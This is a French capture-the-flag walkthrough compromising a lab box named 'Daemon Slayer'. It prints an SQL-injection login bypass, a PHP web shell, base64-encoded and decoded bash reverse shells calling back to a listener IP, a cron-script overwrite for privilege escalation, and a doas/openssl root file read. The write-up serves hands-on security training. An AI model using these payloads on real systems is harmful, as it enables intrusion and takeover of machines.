# Daemon Slayer - CTF Walkthrough

## Sommaire

1. [Accès au site web admin](#1-accès-au-site-web-admin)
2. [SQL Injection pour se connecter](#2-sql-injection-pour-se-connecter)
3. [Reverse Shell via Upload d'image](#3-reverse-shell-via-upload-dimage)
4. [Escalade via Cron Job](#4-escalade-via-cron-job)
5. [Escalade Root avec doas + OpenSSL](#5-escalade-root-avec-doas--openssl)

---

## 1. Accès au site web admin

On visite :

```
http://<BOX_IP>:445/upper/admin
```

## 2. SQL Injection pour se connecter

Login Bypass via SQLi :

```
admin' -- ' OR 1=1 --
```

On accède au dashboard administrateur.

## 3. Reverse Shell via Upload d'image

On remplace une image uploadée par un fichier `shell.php`. Celui-ci contient un payload codé en base64 :


``` php
<?php system($_GET['cmd']); ?>
```

On peut ensuite envoyer n'importe quel commande grace au `GET` donc on envoie un reverse shell :


```bash
echo "c2ggLWkgPiYgL2Rldi90Y3AvMTAuOC45Mi41OS85MDAyIDA+JjE=" | base64 -d | bash
```

Décodé :

```bash
sh -i >& /dev/tcp/10.8.92.59/9002 0>&1
```

On écoute sur notre machine :

```bash
nc -lvnp 9002
```

Et on obtient un shell.


🎉 **1er Flag obtenu**

## 4. Escalade via Cron Job

On observe un cron job exécuté chaque minute par l'utilisateur `muzan` qui appelle un fichier `backup.sh`.

On supprime le fichier :

```bash
rm /home/muzan/backup.sh
```

Puis on le remplace avec notre propre payload reverse shell.

```bash
echo "bash -i >& /dev/tcp/10.8.92.59/9003 0>&1" > /home/muzan/backup.sh
chmod +x /home/muzan/backup.sh
```

Et on écoute :

```bash
nc -lvnp 9003
```

Shell en tant que `muzan` ✅

## 5. Escalade Root avec doas + OpenSSL

En tant que muzan, on vérifie les droits `doas` :

```bash
doas -l
```

Résultat : `muzan` peut utiliser `openssl` en tant que root sans mot de passe.

On utilise la commande suivante pour lire le flag root :

```bash
doas -u root openssl enc -in /root/root.txt
```

Cela permet de lire le contenu du fichier root flag (si chiffré, il faudra adapter avec le bon déchiffrement selon le contexte).

---

🔥 **Root obtenu sur Daemon Slayer !**


🎉 **2ème Flag obtenu**
Les démons n’avaient qu’à bien se tenir 😈
